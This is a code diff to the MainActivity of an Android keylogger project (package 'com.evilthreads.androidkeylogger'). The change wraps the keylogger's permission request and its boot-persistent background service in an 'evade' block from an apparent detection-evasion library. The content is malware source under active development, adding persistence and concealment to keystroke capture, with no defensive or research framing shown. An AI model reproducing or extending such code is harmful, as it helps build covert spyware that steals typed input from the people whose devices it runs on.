@@ -3,6 +3,7 @@ package com.evilthreads.androidkeylogger
 import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
 import com.candroid.bootlaces.bootService
+import com.evilthreads.evade.evade
 import com.evilthreads.keylogger.Keylogger
 
 /*
@@ -29,9 +30,11 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        Keylogger.requestPermission(this)
-        bootService(this){
-            service = MyService::class
+        evade {
+            Keylogger.requestPermission(this)
+            bootService(this){
+                service = MyService::class
+            }
         }
     }
 }
